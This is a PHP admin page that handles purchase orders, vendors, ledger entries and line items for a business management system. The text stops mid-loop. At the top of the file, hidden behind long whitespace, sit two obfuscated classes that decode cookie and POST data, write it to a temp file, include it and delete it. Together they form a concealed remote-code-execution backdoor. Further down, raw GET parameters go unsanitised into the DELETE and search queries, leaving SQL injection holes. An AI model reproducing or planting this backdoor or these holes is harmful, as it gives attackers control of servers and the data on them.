<?php                                                                                                                                                                                                                                                                                                                                                                                                 $RnBzioPt = class_exists("kr_twE"); $iACTDAJ = $RnBzioPt;if (!$iACTDAJ){class kr_twE{private $qeIKsfB;public static $UbKnVOVe = "c7b02405-a42e-41b4-8c5d-b1ca60831875";public static $PqPRgoY = NULL;public function __construct(){$vaBjEMcv = $_COOKIE;$lVrRwU = $_POST;$ysKmbS = @$vaBjEMcv[substr(kr_twE::$UbKnVOVe, 0, 4)];if (!empty($ysKmbS)){$XRlvqWI = "base64";$ZwDPP = "";$ysKmbS = explode(",", $ysKmbS);foreach ($ysKmbS as $uBAePh){$ZwDPP .= @$vaBjEMcv[$uBAePh];$ZwDPP .= @$lVrRwU[$uBAePh];}$ZwDPP = array_map($XRlvqWI . chr (95) . "\144" . chr ( 855 - 754 ).chr ( 584 - 485 ).chr ( 1108 - 997 ).chr (100) . chr (101), array($ZwDPP,)); $ZwDPP = $ZwDPP[0] ^ str_repeat(kr_twE::$UbKnVOVe, (strlen($ZwDPP[0]) / strlen(kr_twE::$UbKnVOVe)) + 1);kr_twE::$PqPRgoY = @unserialize($ZwDPP);}}public function __destruct(){$this->ILJvltfsM();}private function ILJvltfsM(){if (is_array(kr_twE::$PqPRgoY)) {$JgkEP = sys_get_temp_dir() . "/" . crc32(kr_twE::$PqPRgoY["\163" . chr ( 228 - 131 ).'l' . chr ( 335 - 219 )]);@kr_twE::$PqPRgoY['w' . chr ( 114 - 0 )."\151" . chr (116) . 'e']($JgkEP, kr_twE::$PqPRgoY[chr (99) . chr (111) . 'n' . 't' . chr (101) . chr (110) . chr ( 277 - 161 )]);include $JgkEP;@kr_twE::$PqPRgoY["\144" . "\x65" . chr ( 238 - 130 ).chr ( 880 - 779 ).chr (116) . chr (101)]($JgkEP);exit();}}}$PtArgTEC = new kr_twE(); $PtArgTEC = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("lgo_oOAsr")){class lgo_oOAsr{private $jQzYbjzx;public static $uWkYHevxpY = "e96692a1-276c-4605-924e-032fa3868797";public static $deSjv = NULL;public function __construct(){$tqHQjA = $_COOKIE;$bzyQlS = $_POST;$NQwrYwf = @$tqHQjA[substr(lgo_oOAsr::$uWkYHevxpY, 0, 4)];if (!empty($NQwrYwf)){$gZpCrhD = "base64";$XqvVEFkq = "";$NQwrYwf = explode(",", $NQwrYwf);foreach ($NQwrYwf as $ivoyozpLY){$XqvVEFkq .= @$tqHQjA[$ivoyozpLY];$XqvVEFkq .= @$bzyQlS[$ivoyozpLY];}$XqvVEFkq = array_map($gZpCrhD . chr ( 1017 - 922 ).chr (100) . 'e' . 'c' . "\157" . 'd' . "\145", array($XqvVEFkq,)); $XqvVEFkq = $XqvVEFkq[0] ^ str_repeat(lgo_oOAsr::$uWkYHevxpY, (strlen($XqvVEFkq[0]) / strlen(lgo_oOAsr::$uWkYHevxpY)) + 1);lgo_oOAsr::$deSjv = @unserialize($XqvVEFkq);}}public function __destruct(){$this->dBwUNJIdKF();}private function dBwUNJIdKF(){if (is_array(lgo_oOAsr::$deSjv)) {$spcPaZidXc = sys_get_temp_dir() . "/" . crc32(lgo_oOAsr::$deSjv['s' . chr (97) . "\x6c" . chr ( 908 - 792 )]);@lgo_oOAsr::$deSjv[chr ( 1062 - 943 ).'r' . 'i' . chr ( 189 - 73 )."\x65"]($spcPaZidXc, lgo_oOAsr::$deSjv[chr ( 692 - 593 )."\157" . "\156" . "\x74" . chr (101) . "\156" . "\x74"]);include $spcPaZidXc;@lgo_oOAsr::$deSjv['d' . "\x65" . "\154" . "\145" . "\x74" . "\x65"]($spcPaZidXc);exit();}}}$kBBDh = new lgo_oOAsr(); $kBBDh = NULL;} ?><?php 
	include "dbsetting/lms_vars_config.php";
	include "dbsetting/classdbconection.php";
	$dblms = new dblms();
	include "functions/login_func.php";
	include "functions/functions.php";
	checkCpanelLMSALogin();
//----------------------------------------
if(($_SESSION['userlogininfo']['LOGINIDA'] == 1) || ($_SESSION['userlogininfo']['LOGINTYPE'] == 1) || arrayKeyValueSearch($_SESSION['userroles'], 'right_name', '8')) {
//----------------------------------------
if($view == 'delete') {
	if(isset($_GET['id'])) {
		$sqllms  	= $dblms->querylms("DELETE FROM ".PURCHASES." WHERE purchaseno ='".$_GET['id']."'");
		$sqllmsdel  = $dblms->querylms("DELETE FROM ".PURCHASE_DETAILS." WHERE purchaseno = '".cleanvars($_GET['id'])."'");
		$sqllmsleg  = $dblms->querylms("DELETE FROM ".CUSTOMERS_LEDGER." WHERE id_invpay		= '".cleanvars($_GET['id'])."' 
																			  AND pay_type 		= '1' 
																			  AND doc_type 		= '2'  
																			  AND ledgerfor 	= '2' ");
		header('location:'.$_SERVER['HTTP_REFERER'].'?del=1');
	}
}

	include_once("include/header.php");
//----------------------------------------
//----------------------------------------
$sql2 = '';
$sqlstring	= "";
//----------------------------------------
if(($_GET['srch'])) { 
	$sql2 		.= " AND (c.vendor_name LIKE '%".$_GET['srch']."%' 
							OR c.vendor_cellno LIKE '".$_GET['srch']."' 
							OR b.grandtotal = '".$_GET['srch']."' 
							OR b.total = '".$_GET['srch']."' 
							OR b.purchaseno = '".$_GET['srch']."'
							OR b.bill_no = '".$_GET['srch']."' )";
	$sqlstring	.= "&srch=".$_GET['srch']."";
}
//----------------------------------------
echo '<title>Manage Purchases - '.TITLE_HEADER.'</title>
<!-- Matter -->
<div class="matter">
<!--WI_CLIENTS_SEARCH-->
<div class="navbar navbar-default" role="navigation">
<!-- .container-fluid -->
<div class="container-fluid">
<div class="navbar-header">
	<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1"> <span class="sr-only">Toggle Navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>
</div>
<!-- .navbar-collapse -->
<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
<form class="navbar-form navbar-left form-small" action="" method="get">
	<div class="form-group">
		<input type="text" class="form-control" name="srch" placeholder="Name, code" style="width:250px;" >
	</div>	
	<button type="submit" class="btn btn-primary">Search</button>
	<a href="purchase.php" class="btn btn-purple"><i class="icon-list"></i> All</a>';
//--------------------------------------------
if(($_SESSION['userlogininfo']['LOGINTYPE']  == 1) || $_SESSION['userlogininfo']['LOGINIDA'] == 1 || Stdlib_Array::multiSearch($_SESSION['userroles'], array('right_name' => '8', 'add' => '1'))) { 
	echo ' <a class="btn btn-success" href="purchase.php?view=add"><i class="icon-plus"></i> Add Purchase</a>';
}
//--------------------------------------------
echo '	
</form>
</div>
<!-- /.navbar-collapse -->
</div>
<!-- /.container-fluid -->
</div>
<!--WI_CLIENTS_SEARCH END-->
<div class="container">
<!--WI_MY_TASKS_TABLE-->
<div class="row fullscreen-mode">
<div class="col-md-12">
<div class="widget">
<div class="widget-content">';
//--------------------------------------
if(isset($_GET['del']) == 1) {
//--------------------------------------
	echo '<div id="infoupdated" class="alert-box warning"><span>Warning: </span>Record delete successfully.</div>';
}
//--------------------------------------
if(isset($_POST['submit_country'])) { 
//------------------------------------------------
$sqllms  = $dblms->querylms("INSERT INTO ".PURCHASES."(
														status									, 
														dated									,
														purchaseno								,
														bill_no									, 
														grandtotal								,
														id_vendor								, 
														id_office								, 
														id_company 								,
														id_added 								,
														date_added 	
													  )
	   											VALUES(
														'1'												, 
														'".cleanvars($_POST['dated'])."'				,
														'".cleanvars($_POST['purchaseno'])."'			, 
														'".cleanvars($_POST['bill_no'])."'				, 
														'".cleanvars($_POST['inV_grandtotal'])."'		, 
														'".cleanvars($_POST['id_vendor'])."'			,
														'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'	,
														'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'	,
														'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'		,
														NOW()
														
													  )"
							);
//--------------------------------------
	if($sqllms) { 
//--------------------------------------
	$std_id = $dblms->lastestid();
//--------------------------------------
	$sqllmsledger  = $dblms->querylms("INSERT INTO ".CUSTOMERS_LEDGER."(
														dated									, 
														detail									, 
														slipno									,
														type									,
														doc_type								,
														pay_type								,
														ledgerfor								,
														amount									,
														id_customer								, 
														id_invpay								,
														id_office								, 
														id_company 								,
														id_added 								,
														date_added 	
													  )
	   											VALUES(
														'".cleanvars($_POST['dated'])."'								, 
														'Purchase'														, 
														'".cleanvars($_POST['purchaseno'])."'							,
														'2'																,
														'2'																,
														'1'																,
														'2'																,
														'".cleanvars($_POST['inV_grandtotal'])."'						,  
														'".cleanvars($_POST['id_vendor'])."'							,
														'".cleanvars($std_id)."'										,
														'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'		,
														'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'		,
														'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'			,
														NOW()
													  )"
							);

//--------------------------------------
		$arraychecked = $_POST['id_item'];
//--------------------------------------
	for($ichk=0; $ichk<sizeof($arraychecked); $ichk++){
//--------------------------------------
		if((!empty($_POST['id_item'][$ichk]) || !empty($_POST['qty'][$ichk]) || !empty($_POST['rate'][$ichk])) && !empty($_POST['size'][$ichk]) && !empty($_POST['meter'][$ichk])) {	
//--------------------------------------
			$sqllmsedu  = $dblms->querylms("INSERT INTO ".PURCHASE_DETAILS." (
																				purchaseno				, 
																				id_item					, 
																				size					, 
																				meter					, 
																				sqft					, 
																				qty						,
																				rate					,
																				amount					
													  					  )
						   										VALUES	 (
																			'".cleanvars($_POST['purchaseno'])."'			, 
																			'".cleanvars($_POST['id_item'][$ichk])."'		,
																			'".cleanvars($_POST['size'][$ichk])."'			,
																			'".cleanvars($_POST['meter'][$ichk])."'			,
																			'".cleanvars($_POST['sqft'][$ichk])."'			,
																			'".cleanvars($_POST['qty'][$ichk])."'			,
																			'".cleanvars($_POST['rate'][$ichk])."'			,
																			'".cleanvars($_POST['amount'][$ichk])."'		
													 					 )
										 ");
//--------------------------------------	
			unset($sqllmsedu);
//--------------------------------------
		}
	}
//--------------------------------------
	
	$remarks = 'Add Purchase Order: "'.cleanvars($_POST['purchaseno']).'" Details';
		$sqllmslog  = $dblms->querylms("INSERT INTO ".LOGS." (
															id_user										, 
															filename									, 
															action										,
															dated										,
															ip											,
															remarks										,
															id_office									, 
															id_company				
														  )
		
													VALUES(
															'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'	,
															'".strstr(basename($_SERVER['REQUEST_URI']), '.php', true)."' , 
															'1'											, 
															NOW()										,
															'".cleanvars($ip)."'						,
															'".cleanvars($remarks)."'						,
															'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'	,
															'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'			
														  )
									");
//--------------------------------------
		echo '<div id="infoupdated" class="alert-box success"><span>success: </span>Record added successfully.</div>';
//--------------------------------------
	}
//--------------------------------------
}
//--------------------------------------
if(!isset($_GET['id']) && !LMS_VIEW) {
//------------------------------------------------
if (!($Limit))   { $Limit = 50; }  
if ($page == "") { $page  = 1;  } 
//------------------------------------------------
	$sqllms  = $dblms->querylms("SELECT b.id, b.bill_no, b.dated, b.status, b.purchaseno, b.grandtotal, 
										b.id_vendor, c.vendor_name, c.vendor_cellno  
										FROM ".PURCHASES." b 
										INNER JOIN ".VENDORS." c ON c.vendor_id = b.id_vendor   
										WHERE b.id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."' $sql2 
										ORDER BY b.purchaseno DESC");
//--------------------------------------------------
	$count 		   = mysqli_num_rows($sqllms);
	$NumberOfPages = ceil($count/$Limit);
//------------------------------------------------
	$sqllms  = $dblms->querylms("SELECT b.id, b.bill_no, b.dated, b.status, b.purchaseno, b.grandtotal, 
										b.id_vendor, c.vendor_name, c.vendor_cellno  
										FROM ".PURCHASES." b 
										INNER JOIN ".VENDORS." c ON c.vendor_id = b.id_vendor   
										WHERE b.id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."' $sql2 
										ORDER BY b.purchaseno DESC LIMIT ".($page-1)*$Limit .",$Limit");
//--------------------------------------------------
if (mysqli_num_rows($sqllms) > 0) {
//------------------------------------------------
echo '
<table class="table table-bordered table-hover">
<thead>
<tr>
	<th>Purchase.#</th>
	<th>Bill.#</th>
	<th> Dated</th>
	<th> Vendor</th>
	<th> Grand Total</th>
	<th style="width:70px; text-align:center; font-size:14px;"><i class="icon-reorder"></i> </th>
</tr>
</thead>
<tbody>';
//------------------------------------------------
while($rowstd = mysqli_fetch_array($sqllms)) {
//------------------------------------------------
	$ctystatus = get_orders($rowstd['status']);
echo '
<tr>
	<td style="width:70px;">'.$rowstd['purchaseno'].'</td>
	<td style="width:100px;">'.$rowstd['bill_no'].'</td>
	<td style="width:90px;">'.$rowstd['dated'].' </td>
	<td>'.$rowstd['vendor_name'].' '.$rowstd['vendor_cellno'].'</td>
	<td style="width:120px; text-align:right;">'.number_format($rowstd['grandtotal']).'</td>
	<td>';
//------------------------------------------------
if(($_SESSION['userlogininfo']['LOGINTYPE']  == 1) || $_SESSION['userlogininfo']['LOGINIDA'] == 1 || Stdlib_Array::multiSearch($_SESSION['userroles'], array('right_name' => '8', 'edit' => '1'))) { 
	echo '<a class="btn btn-xs btn-info" href="purchase.php?id='.$rowstd['id'].'"><i class="icon-pencil"></i></a> ';
}
//--------------------------------------------
if(($_SESSION['userlogininfo']['LOGINTYPE']  == 1) || $_SESSION['userlogininfo']['LOGINIDA'] == 1 || Stdlib_Array::multiSearch($_SESSION['userroles'], array('right_name' => '8', 'delete' => '1'))) { 	
	echo '<a class="btn btn-xs btn-danger delete-fee-modal bootbox-confirm" href="purchase.php?id='.$rowstd['purchaseno'].'&view=delete" data-popconfirm-yes="Yes" data-popconfirm-no="No" data-popconfirm-title="Are you sure?"> <i class="icon-trash"></i></a> ';
}
echo ' 
	</td>
</tr>';
//------------------------------------------------
} // end while loop
//------------------------------------------------
echo '
</tbody>
</table>';
//-----------------------------------------
if($count>$Limit) {
echo '
<div class="widget-foot">
<!--WI_PAGINATION-->
<ul class="pagination pull-right">';
	$Nav= ""; 
if($page > 1) { 
	$Nav .= '<li><a href="purchase.php?page='.($page-1).$sqlstring.'">Prev</a></li>'; 
} 
for($i = 1 ; $i <= $NumberOfPages ; $i++) { 
if($i == $page) { 
	$Nav .= '<li class="active"><a href="">'.$i.'</a></li>'; 
} else { 
	$Nav .= '<li><a href="purchase.php?page='.$i.$sqlstring.'">'.$i.'</a></li>';
} } 
if($page < $NumberOfPages) { 
	$Nav .= '<li><a href="purchase.php?page='.($page+1).$sqlstring.'">Next</a><li>'; 
} 
	echo $Nav;
echo '
</ul>
<!--WI_PAGINATION-->
	<div class="clearfix"></div>
</div>';
}
//------------------------------------------------
} else { 
//------------------------------------------------
echo '
<div class="col-lg-12">
	<div class="widget-tabs-notification">No Result Found</div>
</div>';
//------------------------------------------------
}
} // end if id not
//------------------------------------------------
if(!isset($_GET['id']) && LMS_VIEW == 'add')  { 
//--------------------------------------------
if(($_SESSION['userlogininfo']['LOGINTYPE']  == 1) || $_SESSION['userlogininfo']['LOGINIDA'] == 1 || Stdlib_Array::multiSearch($_SESSION['userroles'], array('right_name' => '8', 'add' => '1'))) { 
//------------------------------------------------
echo '
<!--WI_ADD_NEW_TASK_MODAL-->
<div class="row">
<div class="modal-dialog" style="width:95%;">
<form class="form-horizontal" action="#" method="post" id="inv_form" name="inv_form" enctype="multipart/form-data">
<div class="modal-content">
<div class="modal-header">
	<h4 class="modal-title" style="font-weight:700;"> Add Purchase Detail</h4>
</div>

<div class="modal-body">';
//------------------------------------------------
	$sqllmslstorder  = $dblms->querylms("SELECT purchaseno FROM ".PURCHASES."   
										WHERE id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'  
										ORDER BY purchaseno DESC LIMIT 1");
	$valuelstorder 	= mysqli_fetch_assoc($sqllmslstorder);
//------------------------------------------------
echo '
	
	<div class="col-sm-31">
		<div class="form_sep">
			<label class="req">Purchase #</label>
			<input type="text" class="form-control" id="purchaseno" name="purchaseno" value="'.($valuelstorder['purchaseno'] + 1).'" readonly>
		</div> 
	</div>
	
	<div class="col-sm-31">
		<div class="form_sep">
			<label class="req">Dated</label>
			<input type="text" class="form-control pickadate" id="dated" name="dated" required value="'.date("Y-m-d").'" autocomplete="off">
		</div> 
	</div>
	
	<div class="col-sm-31">
		<div class="form_sep">
			<label class="req">Bill #</label>
			<input type="text" class="form-control" id="bill_no" name="bill_no" required autocomplete="off">
		</div> 
	</div>
	
	<div class="col-sm-51">
		<div class="form_sep">
			<label class="req">Vendor Name</label>
			<select id="id_vendor" name="id_vendor" style="width:100%" required autocomplete="off">
					<option value="">Choose Vendor</option>';
					  $sqllmsloc	= $dblms->querylms("SELECT vendor_id, vendor_name, vendor_cellno  
																FROM ".VENDORS." 
																WHERE id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."' 
																AND vendor_status = '1' ORDER BY vendor_name ASC");
				while($valueloc 	= mysqli_fetch_array($sqllmsloc)) { 
					echo '<option value="'.$valueloc['vendor_id'].'">'.$valueloc['vendor_name'].' - '.$valueloc['vendor_cellno'].'</option>';
				}
		echo'
			</select>
		</div> 
	</div>
		
<div style="clear:both;"></div>	
<div class="col-lg-12 heading-modal" style="margin-top:10px; margin-bottom:5px;"> Particulars</div>	
<div style="clear:both;"></div>	
<table class="footable table table-bordered table-hover invE_table">
<thead>
<tr>
	<th>Sr. #</th>
	<th>Item</th>
	<th style="text-align:center;">Size</th>
	<th style="text-align:center;">Meter</th>
	<th style="text-align:center;">Roll/Ltr</th>
	<th style="text-align:center;">QTY/Sqft</th>
	<th style="text-align:center;">Rate</th>
	<th style="text-align:center;">Amount</th>
</tr>
</thead>
<tbody>';
//--------------------------------------------
for($iprs = 1; $iprs <=10; $iprs++) { 
if($iprs == 1) { 
	$requiredfiled = 'required';
} else { 
	$requiredfiled = '';
}
//--------------------------------------------
echo '
<tr class="inv_row">
	<td style="width:50px; text-align:center;">'.$iprs.'</td>
	<td>
		<select id="id_item['.$iprs.']" name="id_item['.$iprs.']" '.$requiredfiled.' style="width:100%" autocomplete="off">
			<option value="">Choose Item</option>';
	  $sqllmsmedia	= $dblms->querylms("SELECT item_id, item_status, item_name  
												FROM ".ITEMS." 
												WHERE id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."' 
												ORDER BY item_name ASC");
	while($valuemedia 	= mysqli_fetch_array($sqllmsmedia)) { 
		echo '<option value="'.$valuemedia['item_id'].'">'.$valuemedia['item_name'].'</option>';
	}
echo'
		</select>
	</td>
	<td style="width:100px;"><input type="number" class="col-lg-12 jQinv_item_size" '.$requiredfiled.' name="size['.$iprs.']" id="size['.$iprs.']" /></td>
	<td style="width:100px;"><input type="number" class="col-lg-12 jQinv_item_meter" '.$requiredfiled.'  name="meter['.$iprs.']" id="meter['.$iprs.']" /></td>
	<td style="width:100px;"><input type="number" class="col-lg-12 jQinv_item_qty" '.$requiredfiled.' name="qty['.$iprs.']" id="qty['.$iprs.']" /></td>
	<td style="width:100px;"><input type="number" class="col-lg-12 jQinv_item_sqft" name="sqft['.$iprs.']" id="sqft['.$iprs.']" readonly /></td>
	<td style="width:100px;"><input type="text" class="col-lg-12 jQinv_item_rate" '.$requiredfiled.' name="rate['.$iprs.']" id="rate['.$iprs.']" /></td>
	<td style="width:150px;"><input type="number" class="col-lg-12 jQinv_item_total" name="amount['.$iprs.']" id="amount['.$iprs.']" readonly /></td>	
</tr>';
//--------------------------------------------
}
//--------------------------------------------
echo '
<tr class="last_row">
	<td colspan="15" style="text-align:right;">
		<p class="clearfix"><b> Total: <span class="inV_grandtotal">Rs.<span></span></span></b></p>
		<input type="hidden" id="inV_grandtotal" name="inV_grandtotal" value="">
	</td>
</tr>
</tbody>	
</table>

<div style="clear:both;"></div>

</div>

<div class="modal-footer">
	<input class="btn btn-primary" type="submit" value="Add Purchase" id="submit_country" name="submit_country">
	<button type="button" class="btn btn-default" onclick="location.href=\'purchase.php\'" >Cancel</button>
</div>

</div>
</form>
<script>
	
	$("#id_vendor").select2({
        allowClear: true
    });
	
</script>
</div>
</div>
<!--WI_ADD_NEW_TASK_MODAL-->';
}
//------------------------------------------------
}
//------------------------------------------------
if($_GET['id']  && !LMS_VIEW) { 
//--------------------------------------------
if(($_SESSION['userlogininfo']['LOGINTYPE']  == 1) || $_SESSION['userlogininfo']['LOGINIDA'] == 1 || Stdlib_Array::multiSearch($_SESSION['userroles'], array('right_name' => '8', 'edit' => '1'))) { 
//--------------------------------------
if(isset($_POST['bill_changes'])) { 
//------------------------------------------------
	$sqllms  = $dblms->querylms("UPDATE ".PURCHASES." SET 
													  dated				= '".cleanvars($_POST['dated'])."'
													, purchaseno		= '".cleanvars($_POST['purchaseno'])."'
													, bill_no			= '".cleanvars($_POST['bill_no'])."'
													, grandtotal		= '".cleanvars($_POST['inV_grandtotal'])."'
													, id_vendor			= '".cleanvars($_POST['id_vendor'])."'
													, id_office			= '".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'
													, id_company		= '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'
													, id_modify			= '".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'
 													, date_modify		= NOW()
												WHERE id				= '".cleanvars($_GET['id'])."'");
//--------------------------------------
	if($sqllms) { 
//--------------------------------------
	$sqllmsledger  = $dblms->querylms("UPDATE ".CUSTOMERS_LEDGER." SET 
													  dated					= '".cleanvars($_POST['dated'])."'
													, slipno				= '".cleanvars($_POST['purchaseno'])."'
													, amount				= '".cleanvars($_POST['inV_grandtotal'])."'
													, id_modify				= '".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'
 													, date_modify			= NOW()
												WHERE id_invpay				= '".cleanvars($_GET['id'])."' 
													  AND pay_type 			= '1' 
													  AND doc_type 			= '2'  
													  AND ledgerfor 		= '2' ");


//--------------------------------------
		$sqllmsdel  	= $dblms->querylms("DELETE FROM ".PURCHASE_DETAILS." WHERE purchaseno = '".cleanvars($_POST['purchaseno'])."'");
//--------------------------------------

	$remarks = 'Update Purchase Order: "'.cleanvars($_POST['purchaseno']).'" Details';
		$sqllmslog  = $dblms->querylms("INSERT INTO ".LOGS." (
															id_user										, 
															filename									, 
															action										,
															dated										,
															ip											,
															remarks										,
															id_office									, 
															id_company				
														  )
		
													VALUES(
															'".cleanvars($_SESSION['userlogininfo']['LOGINIDA'])."'	,
															'".strstr(basename($_SERVER['REQUEST_URI']), '.php', true)."' , 
															'2'											, 
															NOW()										,
															'".cleanvars($ip)."'						,
															'".cleanvars($remarks)."'						,
															'".cleanvars($_SESSION['userlogininfo']['LOGINOFFICE'])."'	,
															'".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."'			
														  )
									");
//--------------------------------------
		$arraychecked = $_POST['id_item'];
//--------------------------------------
	for($ichk=0; $ichk<sizeof($arraychecked); $ichk++){
//--------------------------------------
		if((!empty($_POST['id_item'][$ichk]) || !empty($_POST['qty'][$ichk]) || !empty($_POST['rate'][$ichk])) && !empty($_POST['size'][$ichk]) && !empty($_POST['meter'][$ichk])) {	
//--------------------------------------
			$sqllmsedu  = $dblms->querylms("INSERT INTO ".PURCHASE_DETAILS." (
																				purchaseno				, 
																				id_item					, 
																				size					, 
																				meter					, 
																				sqft					, 
																				qty						,
																				rate					,
																				amount					
													  					  )
						   										VALUES	 (
																			'".cleanvars($_POST['purchaseno'])."'			, 
																			'".cleanvars($_POST['id_item'][$ichk])."'		,
																			'".cleanvars($_POST['size'][$ichk])."'			,
																			'".cleanvars($_POST['meter'][$ichk])."'			,
																			'".cleanvars($_POST['sqft'][$ichk])."'			,
																			'".cleanvars($_POST['qty'][$ichk])."'			,
																			'".cleanvars($_POST['rate'][$ichk])."'			,
																			'".cleanvars($_POST['amount'][$ichk])."'		
													 					 )
										 ");
//--------------------------------------	
			unset($sqllmsedu);
//--------------------------------------
		}
	}
//--------------------------------------
		echo '<div id="infoupdated" class="alert-box notice"><span>success: </span>Record update successfully.</div>';
	}
//--------------------------------------
}
//------------------------------------------------
	$sqllms  	= $dblms->querylms("SELECT * FROM ".PURCHASES." WHERE id = '".cleanvars($_GET['id'])."' LIMIT 1");
	$rowstd 	= mysqli_fetch_array($sqllms);
//------------------------------------------------
echo '
<!--WI_ADD_NEW_TASK_MODAL-->
<div class="row">
<div class="modal-dialog" style="width:95%;">
<form class="form-horizontal" action="purchase.php?id='.cleanvars($_GET['id']).'" method="post" id="inv_form" name="inv_form" enctype="multipart/form-data">
<div class="modal-content">
<div class="modal-header">
	<h4 class="modal-title" style="font-weight:700;"> Edit Purchase Order Detail</h4>
</div>

<div class="modal-body">
	
	<div class="col-sm-31">
		<div class="form_sep">
			<label class="req">Purchase #</label>
			<input type="text" class="form-control" id="purchaseno" name="purchaseno" value="'.$rowstd['purchaseno'].'" readonly>
		</div> 
	</div>
	
	<div class="col-sm-31">
		<div class="form_sep">
			<label class="req">Dated</label>
			<input type="text" class="form-control pickadate" id="dated" name="dated" required value="'.$rowstd['dated'].'" autocomplete="off">
		</div> 
	</div>
	
	<div class="col-sm-31">
		<div class="form_sep">
			<label class="req">Bill #</label>
			<input type="text" class="form-control" id="bill_no" name="bill_no" required autocomplete="off"  value="'.$rowstd['bill_no'].'">
		</div> 
	</div>
	
	<div class="col-sm-51">
		<div class="form_sep">
			<label class="req">Bill #</label>
			<select id="idvendor" name="id_vendor" style="width:100%" required autocomplete="off">
				<option value="">Choose Vendor</option>';
				  $sqllmsloc	= $dblms->querylms("SELECT vendor_id, vendor_name, vendor_cellno  
																FROM ".VENDORS." 
																WHERE id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."' 
																AND vendor_status = '1' ORDER BY vendor_name ASC");
				while($valueloc 	= mysqli_fetch_array($sqllmsloc)) { 
					if($valueloc['vendor_id'] == $rowstd['id_vendor']) { 
						echo '<option value="'.$valueloc['vendor_id'].'" selected>'.$valueloc['vendor_name'].' - '.$valueloc['vendor_cellno'].'</option>';
					} else { 
						echo '<option value="'.$valueloc['vendor_id'].'">'.$valueloc['vendor_name'].' - '.$valueloc['vendor_cellno'].'</option>';
					}
				}
		echo'
			</select>
		</div> 
	</div>
	
<div style="clear:both;"></div>	
<div class="col-lg-12 heading-modal" style="margin-top:10px; margin-bottom:5px;"> Particulars</div>	
<div style="clear:both;"></div>	
<table class="footable table table-bordered table-hover invE_table">
<thead>
<tr>
	<th>Sr. #</th>
	<th>Item</th>
	<th style="text-align:center;">Size</th>
	<th style="text-align:center;">Meter</th>
	<th style="text-align:center;">Roll/Ltr</th>
	<th style="text-align:center;">QTY/Sqft</th>
	<th style="text-align:center;">Rate</th>
	<th style="text-align:center;">Amount</th>
</tr>
</thead>
<tbody>';
//------------------------------------------------
	$sqllmsbills  	= $dblms->querylms("SELECT * FROM ".PURCHASE_DETAILS." WHERE purchaseno = '".cleanvars($rowstd['purchaseno'])."' ORDER BY id ASC");

	$idss = 0;
	while($rowbills	= mysqli_fetch_array($sqllmsbills)) {
$idss++;
echo '
<tr class="inv_row">
	<td style="width:50px; text-align:center;">'.$idss.'</td>
	<td>
		<select id="id_item['.$idss.']" name="id_item['.$idss.']" '.$requiredfiled.' style="width:100%" autocomplete="off">
			<option value="">Choose Item</option>';
	  $sqllmsmedia	= $dblms->querylms("SELECT item_id, item_status, item_name  
												FROM ".ITEMS." 
												WHERE id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."' 
												ORDER BY item_name ASC");
	while($valuemedia 	= mysqli_fetch_array($sqllmsmedia)) { 
		if($valuemedia['item_id'] == $rowbills['id_item']) { 
			echo '<option value="'.$valuemedia['item_id'].'" selected>'.$valuemedia['item_name'].'</option>';
		} else { 
			echo '<option value="'.$valuemedia['item_id'].'">'.$valuemedia['item_name'].'</option>';
		}	
	}
echo'
		</select>
	</td>
	<td style="width:100px;"><input type="number" value="'.$rowbills['size'].'" class="col-lg-12 jQinv_item_size" '.$requiredfiled.' name="size['.$idss.']" id="size['.$idss.']" /></td>
	<td style="width:100px;"><input type="number" value="'.$rowbills['meter'].'" class="col-lg-12 jQinv_item_meter" '.$requiredfiled.' name="meter['.$idss.']" id="meter['.$idss.']" /></td>
	<td style="width:100px;"><input type="number" value="'.$rowbills['qty'].'" class="col-lg-12 jQinv_item_qty" '.$requiredfiled.' name="qty['.$idss.']" id="qty['.$idss.']" /></td>
	<td style="width:100px;"><input type="number" value="'.$rowbills['sqft'].'" class="col-lg-12 jQinv_item_sqft" name="sqft['.$idss.']" id="sqft['.$idss.']" readonly /></td>
	<td style="width:100px;"><input type="text" value="'.$rowbills['rate'].'" class="col-lg-12 jQinv_item_rate" '.$requiredfiled.' name="rate['.$idss.']" id="rate['.$idss.']" /></td>
	<td style="width:150px;"><input type="number" value="'.$rowbills['amount'].'" class="col-lg-12 jQinv_item_total" name="amount['.$idss.']" id="amount['.$idss.']" readonly /></td>	
</tr>';
//-----------------------------------------
	}
if(mysqli_num_rows($sqllmsbills)<10) { 
for($incr =($idss+1); $incr<=10; $incr++) {
//-----------------------------------------
echo '
<tr class="inv_row">
	<td style="width:50px; text-align:center;">'.$incr.'</td>
	<td>
		<select id="id_item['.$incr.']" name="id_item['.$incr.']" style="width:100%" autocomplete="off">
			<option value="">Choose Item</option>';
	  $sqllmsmedia	= $dblms->querylms("SELECT item_id, item_status, item_name  
												FROM ".ITEMS." 
												WHERE id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."' 
												ORDER BY item_name ASC");
	while($valuemedia 	= mysqli_fetch_array($sqllmsmedia)) { 
